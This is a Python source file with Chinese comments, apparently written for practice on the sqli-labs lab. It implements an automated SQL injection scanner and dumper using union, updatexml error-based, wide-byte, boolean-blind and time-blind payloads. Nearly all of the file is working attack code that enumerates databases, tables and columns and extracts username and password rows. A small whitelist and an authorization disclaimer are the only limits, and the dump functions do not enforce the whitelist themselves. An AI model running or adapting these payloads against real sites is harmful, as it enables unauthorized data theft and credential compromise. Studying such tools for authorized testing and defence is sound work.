"""
SQL注入检测模块-仅限授权测试使用
未经授权禁止使用,使用前确认已获得目标系统所有者的书面授权
"""
import requests
import logging
import re
import ipaddress
from urllib.parse import urlparse

# ===== 全局配置 =====
session = requests.Session()
ALLOWD_TARGETS = [
    "localhost",
    "127.0.0.1",
    "testphp.vulnwec.com"
]
TIMEOUT = 5
ERROR_KEYWORDS = [
    "SQL syntax", "mysql_fetch", "Unknown column",
    "error in your SQL", "XPATH syntax error",
    "Operand should contain", "You have an error"
]

# ===== 日志配置 =====
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] %(asctime)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("scanner.log", encoding="utf-8")
    ]
)

# ===== 基础工具函数 =====
def is_target_allowd(url):
    """检查目标是否在确认白名单内"""
    hostname = urlparse(url).hostname
    if not hostname:
        return False
    if hostname in ALLOWD_TARGETS:
        return True
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback:
            return True
    except ValueError:
        pass
    return False

def send_request(url):
    """统一HTTP请求函数,复用全局session,处理超时、连接异常"""
    try:
        resp = session.get(url, timeout=TIMEOUT, allow_redirects=False)
        return resp
    except Exception as e:
        logging.debug(f"请求失败: {e}")
        return None

def get_baseline(url):
    """获取正常页面基线，用于对比判定"""
    resp = send_request(url)
    if not resp or not resp.text:
        return None
    return {
        "length": len(resp.text),
        "status": resp.status_code,
        "text": resp.text
    }

# ===== 报错型注入格式检测 =====
def detect_error_based(base_url, param_name):
    """检测报错型注入（字符/宽字节/数字），返回注入格式"""
    baseline = get_baseline(base_url)
    if not baseline:
        return ""

    # 1. 字符型注入
    test_char = base_url.replace(f"{param_name}=1", f"{param_name}=1'")
    resp_char = send_request(test_char)
    if resp_char and resp_char.text:
        has_error = any(key in resp_char.text for key in ERROR_KEYWORDS)
        len_diff = abs(len(resp_char.text) - baseline["length"])
        if has_error and len_diff > 20:
            resp_confirm = send_request(test_char)
            if resp_confirm and resp_confirm.text:
                has_error_confirm = any(key in resp_confirm.text for key in ERROR_KEYWORDS)
                if has_error_confirm:
                    logging.info("二次验证通过,确认字符型SQL注入")
                    return "char"

    # 2. 宽字节注入
    test_wide = base_url.replace(f"{param_name}=1", f"{param_name}=1%df'")
    resp_wide = send_request(test_wide)
    if resp_wide and resp_wide.text:
        has_error_wide = any(key in resp_wide.text for key in ERROR_KEYWORDS)
        len_diff_wide = abs(len(resp_wide.text) - baseline["length"])
        if has_error_wide and len_diff_wide > 20:
            resp_wide_confirm = send_request(test_wide)
            if resp_wide_confirm and resp_wide_confirm.text:
                has_error_wide_confirm = any(key in resp_wide_confirm.text for key in ERROR_KEYWORDS)
                if has_error_wide_confirm:
                    logging.info("二次验证通过,确认宽字节SQL注入")
                    return "wide"

    # 3. 数字型注入
    true_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=1")
    false_url = base_url.replace(f"{param_name}=1", f"{param_name}=1 and 1=2")
    resp_true = send_request(true_url)
    resp_false = send_request(false_url)
    if resp_true and resp_false and resp_true.text and resp_false.text:
        len_true = len(resp_true.text)
        len_false = len(resp_false.text)
        if abs(len_true - baseline["length"]) < 10 and abs(len_true - len_false) > 20:
            logging.info("检测到数字型SQL注入")
            return "int"

    return ""

# ===== 联合注入工具函数 =====
def guess_columns(base_url, param_name, inject_format="char", max_columns=20):
    """自动猜解查询字段列数【修复:探测失败返回0,不返回上限值】"""
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("无法获取页面基线，猜解失败")
        return 0
    base_len = baseline["length"]
    len_threshold = max(int(base_len * 0.15), 10)

    for n in range(1, max_columns + 1):
        if inject_format == "char":
            payload = f"1' order by {n} %23"
        elif inject_format == "wide":
            payload = f"1%df' order by {n} %23"
        else:
            payload = f"1 order by {n} %23"
        
        test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
        resp = send_request(test_url)
        if not resp or not resp.text:
            return 0
        
        has_error = any(key in resp.text for key in ERROR_KEYWORDS)
        len_diff = abs(len(resp.text) - base_len)
        if has_error or len_diff > len_threshold:
            result = n - 1
            logging.info(f"列数猜解完成：{result} 列")
            return result
    
    # 打到上限说明探测失效（盲注场景不报错），返回0
    logging.warning(f"列数探测失败，超过上限 {max_columns}，判定为无报错注入场景")
    return 0

def get_echo_positions(base_url, param_name, columns, inject_format="char"):
    """自动定位联合查询的回显位【修复：用带标记的唯一字符串，避免页面固有数字误判】"""
    baseline = get_baseline(base_url)
    if not baseline:
        return []
    
    # 生成带唯一标记的字符串，绝对不会和页面固有内容冲突
    num_str = ','.join([f"'~{i}~'" for i in range(1, columns + 1)])
    if inject_format == "char":
        payload = f"-1' union select {num_str} %23"
    elif inject_format == "wide":
        payload = f"-1%df' union select {num_str} %23"
    else:
        payload = f"-1 union select {num_str} %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    echo_pos = []
    for i in range(1, columns + 1):
        # 只有注入后出现、基线页面没有的标记，才是真正的回显位
        marker = f"~{i}~"
        if marker in resp.text and marker not in baseline["text"]:
            echo_pos.append(i)
    
    filter_echo = [x for x in echo_pos if x != 1]
    if filter_echo:
        echo_pos = filter_echo
    
    if echo_pos:
        logging.info(f"定位到回显位：{echo_pos}")
    else:
        logging.warning("未找到回显位,不支持联合查询注入")
    return echo_pos

def dump_current_db(base_url, param_name, echo_pos, columns, inject_format="char"):
    """获取当前数据库名"""
    query = "concat(0x3c3c3c, database(), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns + 1)]
    select_list[echo_pos[0] - 1] = query
    num_str = ",".join(select_list)

    if inject_format == "char":
        payload = f"-1' union select {num_str} %23"
    elif inject_format == "wide":
        payload = f"-1%df' union select {num_str} %23"
    else:
        payload = f"-1 union select {num_str} %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return ""
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    db_name = match.group(1) if match else ""
    logging.info(f"当前数据库名：{db_name}")
    return db_name

def dump_tables(base_url, param_name, echo_pos, db_name, columns, inject_format="char"):
    """获取指定数据库下所有的表名"""
    db_hex = "0x" + db_name.encode('utf-8').hex()
    field_concat = f"concat(0x3c3c3c, group_concat(table_name), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns + 1)]
    select_list[echo_pos[0] - 1] = field_concat
    select_fields = ','.join(select_list)
    from_part = f"from information_schema.tables where table_schema={db_hex}"

    if inject_format == "char":
        payload = f"-1' union select {select_fields} {from_part} %23"
    elif inject_format == "wide":
        payload = f"-1%df' union select {select_fields} {from_part} %23"
    else:
        payload = f"-1 union select {select_fields} {from_part} %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    tables_str = match.group(1) if match else ""
    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
    logging.info(f"库{db_name}下的表：{tables}")
    return tables

def dump_columns(base_url, param_name, echo_pos, db_name, table_name, columns, inject_format="char"):
    """获取表全部列名【修复：动态生成库名十六进制，移除硬编码】"""
    table_hex = "0x" + table_name.encode('utf-8').hex()
    db_hex = "0x" + db_name.encode('utf-8').hex()
    field_concat = "concat(0x3c3c3c, group_concat(column_name), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns + 1)]
    select_list[echo_pos[0] - 1] = field_concat
    select_fields = ','.join(select_list)
    from_part = f"from information_schema.columns where table_name={table_hex} and table_schema={db_hex}"

    if inject_format == "char":
        payload = f"-1' union select {select_fields} {from_part} %23"
    elif inject_format == "wide":
        payload = f"-1%df' union select {select_fields} {from_part} %23"
    else:
        payload = f"-1 union select {select_fields} {from_part} %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    cols_str = match.group(1) if match else ""
    cols = [c.strip() for c in cols_str.split(",") if c.strip()]
    logging.info(f"表 {table_name} 的列：{cols}")
    return cols

def dump_table_data(base_url, param_name, echo_pos, table_name, columns, inject_format="char"):
    """脱表数据,提取username和password"""
    field_concat = "concat(0x3c3c3c, group_concat(username,0x7c,password), 0x3e3e3e)"
    select_list = [str(i) for i in range(1, columns + 1)]
    select_list[echo_pos[0] - 1] = field_concat
    select_fields = ','.join(select_list)
    from_part = f"from {table_name}"

    if inject_format == "char":
        payload = f"-1' union select {select_fields} {from_part} %23"
    elif inject_format == "wide":
        payload = f"-1%df' union select {select_fields} {from_part} %23"
    else:
        payload = f"-1 union select {select_fields} {from_part} %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    match = re.search(r'<<<(.*?)>>>', resp.text, re.DOTALL)
    data_str = match.group(1) if match else ""
    if not data_str:
        return []
    
    raw_rows = data_str.split(",")
    result = []
    for item in raw_rows:
        if "|" in item:
            u, p = item.split("|", 1)
            result.append({"username": u.strip(), "password": p.strip()})
    
    logging.info(f"脱取数据：{result}")
    return result

def union_auto_dump(base_url, param_name, inject_format):
    """联合注入全自动脱库"""
    logging.info("===== 开始联合注入脱库 =====")
    cols = guess_columns(base_url, param_name, inject_format=inject_format)
    if cols == 0:
        logging.error("列数猜解失败，联合注入不可用")
        return None
    
    echo_pos = get_echo_positions(base_url, param_name, cols, inject_format=inject_format)
    if not echo_pos:
        logging.error("无可用回显位，联合注入失败")
        return None
    
    db_name = dump_current_db(base_url, param_name, echo_pos, cols, inject_format=inject_format)
    if not db_name:
        logging.error("获取库名失败")
        return None
    
    tables = dump_tables(base_url, param_name, echo_pos, db_name, cols, inject_format=inject_format)
    if not tables:
        logging.error("获取表名失败")
        return None
    
    target_table = "users" if "users" in tables else tables[0]
    columns = dump_columns(base_url, param_name, echo_pos, db_name, target_table, cols, inject_format=inject_format)
    data = dump_table_data(base_url, param_name, echo_pos, target_table, cols, inject_format=inject_format)
    
    return {
        "db_name": db_name,
        "tables": tables,
        "target_table": target_table,
        "columns": columns,
        "data": data
    }



#===================新增：报错注入脱库===================
def check_error_based_dump(base_url, param_name, inject_format="char"): 
    """检测是否支持报错注入脱库"""
    if inject_format == "char":
        payload = f"1' AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
    elif inject_format == "wide":
        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
    else:
        payload = f"1 AND updatexml(1, concat(0x7e7e7e, version()), 1) %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return False
    return "~~~" in resp.text and "XPATH" in resp.text

def error_extract_data(html_text):
    """从updatexml报错中提取数据【核心修复：利用原生报错单引号边界】"""
    match = re.search(r"XPATH syntax error: '~~~(.*?)'", html_text, re.DOTALL)
    return match.group(1).strip() if match else ""

def error_dump_db(base_url, param_name, inject_format="char"):
    """报错注入获取当前数据库名"""
    if inject_format == "char":
        payload = f"1' AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
    elif inject_format == "wide":
        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
    else:
        payload = f"1 AND updatexml(1, concat(0x7e7e7e, database()), 1) %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return ""
    
    db_name = error_extract_data(resp.text)
    logging.info(f"当前数据库名：{db_name}")
    return db_name

def error_dump_tables(base_url, param_name, db_name, inject_format="char"):
    """报错注入获取指定库的所有表名"""
    sub_sql = f"(select group_concat(table_name) from information_schema.tables where table_schema=database())"
    
    if inject_format == "char":
        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    elif inject_format == "wide":
        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    else:
        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    tables_str = error_extract_data(resp.text)
    tables = [t.strip() for t in tables_str.split(",") if t.strip()]
    logging.info(f"库{db_name}下的表：{tables}")
    return tables

def error_dump_columns(base_url, param_name, db_name, table_name, inject_format="char"):
    """报错注入获取指定表的所有列名"""
    table_hex = "0x" + table_name.encode('utf-8').hex()
    sub_sql = f"(select group_concat(column_name) from information_schema.columns where table_name={table_hex} and table_schema=database())"
    
    if inject_format == "char":
        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    elif inject_format == "wide":
        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    else:
        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    cols_str = error_extract_data(resp.text)
    cols = [c.strip() for c in cols_str.split(",") if c.strip()]
    logging.info(f"表 {table_name} 的列：{cols}")
    return cols

def error_dump_data(base_url, param_name, table_name, inject_format="char"):
    """报错注入脱取 users 表数据"""
    sub_sql = f"(select group_concat(username, 0x7c, password) from {table_name})"
    
    if inject_format == "char":
        payload = f"1' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    elif inject_format == "wide":
        payload = f"1%df' AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    else:
        payload = f"1 AND updatexml(1, concat(0x7e7e7e, {sub_sql}), 1) %23"
    
    test_url = base_url.replace(f"{param_name}=1", f"{param_name}={payload}")
    resp = send_request(test_url)
    if not resp or not resp.text:
        return []
    
    data_str = error_extract_data(resp.text)
    if not data_str:
        return []
    
    raw_rows = data_str.split(",")
    result = []
    for item in raw_rows:
        if "|" in item:
            u, p = item.split("|", 1)
            result.append({"username": u.strip(), "password": p.strip()})
    
    logging.info(f"脱取数据：{result}")
    return result

def error_auto_dump(base_url, param_name, inject_format):
    """报错注入全自动脱库"""
    logging.info("===== 开始报错注入脱库 =====")
    db_name = error_dump_db(base_url, param_name, inject_format=inject_format)
    if not db_name:
        logging.error("获取库名失败")
        return None
    
    tables = error_dump_tables(base_url, param_name, db_name, inject_format=inject_format)
    if not tables:
        logging.error("获取表名失败")
        return None
    
    target_table = "users" if "users" in tables else tables[0]
    columns = error_dump_columns(base_url, param_name, db_name, target_table, inject_format=inject_format)
    data = error_dump_data(base_url, param_name, target_table, inject_format=inject_format)
    
    return {
        "db_name": db_name,
        "tables": tables,
        "target_table": target_table,
        "columns": columns,
        "data": data
    }


# ===================== 盲注通用核心函数 =====================
def blind_get_length(check_func, url, param_name, sql_expr):
    """盲注猜解数据长度"""
    length = 0
    while True:
        length += 1
        payload = f"LENGTH(({sql_expr}))={length}"
        if check_func(url, param_name, payload):
            return length
        if length > 100:
            return 0

def blind_get_char(check_func, url, param_name, sql_expr, position):
    """二分法猜解单个字符的ASCII码"""
    low = 32
    high = 126
    while low < high:
        mid = (low + high) // 2
        payload = f"ASCII(SUBSTR(({sql_expr}),{position},1))>{mid}"
        if check_func(url, param_name, payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)

def blind_get_data(check_func, url, param_name, sql_expr):
    """盲注获取完整字符串数据"""
    data_len = blind_get_length(check_func, url, param_name, sql_expr)
    if data_len == 0:
        return ""
    result = ""
    for i in range(1, data_len + 1):
        char = blind_get_char(check_func, url, param_name, sql_expr, i)
        result += char
        print(f"\r[*] 正在猜解：{result}", end="")
    print()
    return result

# ===================== 布尔盲注模块 =====================
def is_boolean_true(url, param_name, payload_suffix):
    """布尔盲注：根据页面特征判断条件真假"""
    test_url = url.replace(f"{param_name}=1", f"{param_name}=1' AND {payload_suffix} %23")
    resp = send_request(test_url)
    if not resp:
        return False
    return "You are in" in resp.text

def check_boolean_blind(base_url, param_name):
    """检测布尔盲注是否可用"""
    test_true = is_boolean_true(base_url, param_name, "1=1")
    test_false = not is_boolean_true(base_url, param_name, "1=2")
    if test_true and test_false:
        test_true2 = is_boolean_true(base_url, param_name, "1=1")
        test_false2 = not is_boolean_true(base_url, param_name, "1=2")
        if test_true2 and test_false2:
            logging.info("二次验证通过，确认布尔盲注可用")
            return True
    return False

# ===================== 时间盲注模块 =====================
def is_time_true(url, param_name, payload_suffix, delay=3):
    """时间盲注：根据响应时间判断条件真假"""
    payload = f"1' AND IF({payload_suffix}, SLEEP({delay}), 0) %23"
    test_url = url.replace(f"{param_name}=1", f"{param_name}={payload}")
    
    try:
        resp = session.get(test_url, timeout=10)
    except requests.exceptions.Timeout:
        return True
    
    return resp.elapsed.total_seconds() >= delay * 0.8

def check_time_blind(base_url, param_name):
    """检测时间盲注是否可用【修复：真假双条件校验 + 二次验证】"""
    resp_normal = send_request(base_url)
    if not resp_normal:
        return False
    normal_time = resp_normal.elapsed.total_seconds()
    
    # 真条件延时 + 假条件不延时，双条件校验
    test_true = is_time_true(base_url, param_name, "1=1")
    test_false = not is_time_true(base_url, param_name, "1=2")
    
    if test_true and test_false:
        # 二次验证，避免网络波动误判
        test_true2 = is_time_true(base_url, param_name, "1=1")
        test_false2 = not is_time_true(base_url, param_name, "1=2")
        if test_true2 and test_false2:
            logging.info("二次验证通过，确认时间盲注可用")
            return True
    return False

def blind_auto_dump(check_func, url, param_name):
    """盲注全自动脱库（布尔/时间通用）"""
    logging.info("===== 开始盲注脱库 =====")
    
    dbname = blind_get_data(check_func, url, param_name, "DATABASE()")
    if not dbname:
        logging.error("盲注获取数据库名失败")
        return None
    print(f"[+] 当前数据库名：{dbname}")
    
    count_sql = f"SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{dbname}'"
    table_count_str = blind_get_data(check_func, url, param_name, count_sql)
    table_count = int(table_count_str) if table_count_str.isdigit() else 0
    if table_count == 0:
        logging.error("盲注获取表数量失败")
        return None
    print(f"[+] 共 {table_count} 张表")
    
    tables = []
    for i in range(table_count):
        table_sql = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{dbname}' LIMIT {i},1"
        table_name = blind_get_data(check_func, url, param_name, table_sql)
        tables.append(table_name)
        print(f"  [{i+1}] {table_name}")
    
    target_table = "users" if "users" in tables else tables[0]
    print(f"\n[+] 目标表：{target_table}")
    
    col_count_sql = f"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{dbname}' AND table_name='{target_table}'"
    col_count_str = blind_get_data(check_func, url, param_name, col_count_sql)
    col_count = int(col_count_str) if col_count_str.isdigit() else 0
    if col_count == 0:
        logging.error("盲注获取列数量失败")
        return None
    
    columns = []
    for i in range(col_count):
        col_sql = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{dbname}' AND table_name='{target_table}' LIMIT {i},1"
        col_name = blind_get_data(check_func, url, param_name, col_sql)
        columns.append(col_name)
    print(f"[+] 列名：{columns}")
    
    row_count_sql = f"SELECT COUNT(*) FROM {dbname}.{target_table}"
    row_count_str = blind_get_data(check_func, url, param_name, row_count_sql)
    row_count = int(row_count_str) if row_count_str.isdigit() else 0
    print(f"[+] 共 {row_count} 条数据")
    
    data = []
    for i in range(row_count):
        row_data = {}
        for col in columns:
            data_sql = f"SELECT {col} FROM {dbname}.{target_table} LIMIT {i},1"
            value = blind_get_data(check_func, url, param_name, data_sql)
            row_data[col] = value
        data.append(row_data)
        print(f"  [{i+1}] {row_data}")
    
    return {
        "db_name": dbname,
        "tables": tables,
        "target_table": target_table,
        "columns": columns,
        "data": data
    }

# ===================== 主检测调度函数 =====================
def check_sql_injection(base_url, param_name):
    """
    综合检测注入点，按优先级返回最优注入类型
    优先级：联合注入 > 报错注入 > 布尔盲注 > 时间盲注
    """
    if not is_target_allowd(base_url):
        logging.error("目标不在白名单授权中，拒绝执行")
        return {"has_inject": False, "inject_type": "", "inject_format": ""}
    
    baseline = get_baseline(base_url)
    if not baseline:
        logging.error("目标页面无法访问，检测终止")
        return {"has_inject": False, "inject_type": "", "inject_format": ""}

    # ========== 第一层：先确认注入点是否存在 ==========
    inject_format = ""
    # 1. 先试报错型注入检测
    inject_format = detect_error_based(base_url, param_name)

    # 2. 报错型没检测到，用盲注状态确认注入是否存在
    if not inject_format:
        if check_boolean_blind(base_url, param_name):
            inject_format = "char"
            logging.info("通过布尔状态确认存在字符型注入")
        elif check_time_blind(base_url, param_name):
            inject_format = "char"
            logging.info("通过时间延时确认存在字符型注入")
        else:
            # 所有检测都不通过，才判定无注入
            return {"has_inject": False, "inject_type": "", "inject_format": ""}

    # ========== 第二层：按优先级选最优脱库方式 ==========
    # 1. 优先联合注入（效率最高）
    cols = guess_columns(base_url, param_name, inject_format=inject_format)
    if cols > 0:
        echo_pos = get_echo_positions(base_url, param_name, cols, inject_format=inject_format)
        if echo_pos:
            return {"has_inject": True, "inject_type": "union", "inject_format": inject_format}
    
    # 2. 其次报错注入脱库
    if check_error_based_dump(base_url, param_name, inject_format=inject_format):
        return {"has_inject": True, "inject_type": "error", "inject_format": inject_format}
    
    # 3. 然后布尔盲注
    if check_boolean_blind(base_url, param_name):
        return {"has_inject": True, "inject_type": "boolean_blind", "inject_format": inject_format}
    
    # 4. 最后时间盲注兜底（只要有注入点，这个一定能用）
    if check_time_blind(base_url, param_name):
        return {"has_inject": True, "inject_type": "time_blind", "inject_format": inject_format}
    
    # 极端情况：注入点存在但所有脱库方式都失效
    return {"has_inject": True, "inject_type": "unknown", "inject_format": inject_format}

# ===================== 主入口 =====================
if __name__ == "__main__":
    # 切换测试目标：Less-1/Less-2联合注入 / Less-5报错注入 / Less-8布尔盲注 / Less-9时间盲注
    target_url = "http://localhost/sqli-labs/Less-8/?id=1"
    param = "id"
    
    print("[INFO] 开始检测注入点...")
    result = check_sql_injection(target_url, param)
    
    if not result["has_inject"]:
        print("[-] 未检测到SQL注入")
        exit()
    
    inject_type = result["inject_type"]
    inject_format = result["inject_format"]
    print(f"[+] 注入类型：{inject_type}，注入格式：{inject_format}")
    
    if inject_type == "union":
        dump_result = union_auto_dump(target_url, param, inject_format)
        if dump_result:
            print("\n[+] 联合注入脱库完成！")
            print(f"数据库名：{dump_result['db_name']}")
            print(f"用户数据：{dump_result['data']}")
    
    elif inject_type == "error":
        dump_result = error_auto_dump(target_url, param, inject_format)
        if dump_result:
            print("\n[+] 报错注入脱库完成！")
            print(f"数据库名：{dump_result['db_name']}")
            print(f"用户数据：{dump_result['data']}")
    
    elif inject_type == "boolean_blind":
        dump_result = blind_auto_dump(is_boolean_true, target_url, param)
        if dump_result:
            print("\n[+] 布尔盲注脱库完成！")
    
    elif inject_type == "time_blind":
        dump_result = blind_auto_dump(is_time_true, target_url, param)
        if dump_result:
            print("\n[+] 时间盲注脱库完成！")
